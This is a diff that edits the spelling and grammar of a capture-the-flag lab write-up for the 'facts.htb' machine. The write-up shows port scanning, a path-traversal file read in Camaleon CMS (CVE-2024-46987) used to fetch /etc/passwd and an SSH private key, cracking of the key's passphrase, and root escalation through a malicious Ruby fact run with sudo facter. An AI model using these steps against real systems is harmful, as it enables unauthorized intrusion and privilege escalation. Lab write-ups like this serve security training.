@@ -111,12 +111,12 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 46.20 seconds
 ```
-- We found 3 openports.
+- We found 3 open ports.
 	- 22 ssh 
 	- 80 http ngnix 
 	- 54321 http MinIO
 
-- On visiting port 80 we can see the domain name facts.htb lets add it to our /etc/hosts file.
+- On visiting port 80, we can see the domain name facts.htb. Let's add it to our /etc/hosts file.
 
 ```
 echo "10.129.23.155 facts.htb" | sudo tee -a /etc/hosts
@@ -152,12 +152,11 @@ admin.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 211
 admin.pl                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2106ms]
 :: Progress: [4614/4614] :: Job [1/1] :: 15 req/sec :: Duration: [0:04:56] :: Errors: 0 ::
 ```
-- The **/admin** endpoint redirecting to a login page.
-- create a account and login.
+- The **/admin** endpoint is redirecting to a login page.
+- Create an account and log in.
 - The site using **Camaleon CMS version 2.9.0**
-- The above version is vlnerable to LFI. [CVE-2024-46987
-](https://github.com/Goultarde/CVE-2024-46987.git) the link contians a poc python script.
-- The LFI located in the download_private_file method of the MediaController.
+- The above version is vulnerable to LFI. [CVE-2024-46987](https://github.com/Goultarde/CVE-2024-46987.git) The link contains a poc, python script.
+- The LFI is located in the download_private_file method of the MediaController.
 - This vulnerability allows an authenticated user to download arbitrary files from the server by manipulating the file parameter.
 
 ```
@@ -200,12 +199,12 @@ trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
 william:x:1001:1001::/home/william:/bin/bash
 _laurel:x:101:988::/var/log/laurel:/bin/false
 ```
-- In case if you want to do it manuallly on the browser.
+- In case you want to do it manually on the browser. Here is the vulnerable url.
 ```
 http://facts.htb/admin/media/download_private_file?file=../../../../etc/passwd
 ```
 
-- From the passwd files we can see 3 users
+- From the passwd files, we can see 2 users with a home directory
 ```
 cat passwd.txt | grep bash
 
@@ -214,8 +213,8 @@ trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
 william:x:1001:1001::/home/william:/bin/bash
 ```
 ## Initial Foothold
-- lets see can we aaccess any files in their home directory
-- I try to access /home/trivia/.ssh/id_rsa but it is 500 means file not exists . i asked cahtgpt for common ssh private key file names and tried one by one.
+- Let's see, can we access any files in their home directory
+- I try to access /home/trivia/.ssh/id_rsa, but it is 500 means the file does not exist. I asked cahtgpt for common SSH private key file names and tried one by one.
 ```
 id_rsa
 id_dsa
@@ -223,7 +222,7 @@ id_ecdsa
 id_ed25519
 id_xmss
 ```
-- Found a private key fot the user trivia
+- Found a private key for the user trivia
 ```
  python3 CVE-2024-46987.py -u http://facts.htb -l peter -p  peter@123 -v /home/trivia/.ssh/id_ed25519
 [*] Récupération du token sur http://facts.htb/admin/login
@@ -238,11 +237,11 @@ Z1lcWsQqveUUK7xoFwBg1ywA1jrRutFPX9R+lb5UtOiHdbc++bwMrfxHB16cXozA1uRuqO
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-- Lets save the private key to id_rsa . and extract hash using ssh2john.
+- Let's save the private key to id_rsa. and extract the hash using ssh2john.
 ```
 ssh2john id_rsa > hash.txt
 ```
-- Crach the hash using john or hashcat.
+- Crack the hash using John or hashcat.
 ```
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
 
@@ -258,15 +257,15 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 
 ```
-- Now we have the password for the ssh private key **dragonballz** .  
-- lets login to ssh as trivia.
+- Now we have the password for the ssh private key **dragonballz**.  
+- lets login to SSH as trivia.
 
 ```
 chmod 600 id_rsa
 
 ssh -i id_rsa trivia@facts.htb
 ```
-- We got the shell. we are trivia now :).
+- We got the shell. We are trivia now :).
 
 ## user.txt
 
@@ -287,10 +286,10 @@ User trivia may run the following commands on facts:
 - the user trivia can run **/usr/bin/facter** as root without password. 
 - ***Facter is a lightweight, cross-platform system profiling tool used to gather detailed information (facts) about a Linux system—such as IP addresses, OS version, hardware specs, and uptime***
 
-- Well facter is seems harmless but it is if it runs with elevated privilages. it has a ability to execute ruby scripts. 
+- Well, facter seems harmless, but it is if it runs with elevated privileges. It can execute Ruby scripts. 
 - Found this on [gtfobins](https://gtfobins.org/gtfobins/facter/).
 - Write a malisious ruby script and execute it with facter as root.
-- Well the tool loads facts, which are written in ruby.  so i write a malisious fact that pwn a /bin/bash
+- Well, the tool loads facts, which are written in Ruby.  So I write a malicious fact that pwns /bin/bash
 ```
 echo 'Facter.add("pwn") { setcode { system("/bin/bash") } }' > /tmp/pwn.rb
 
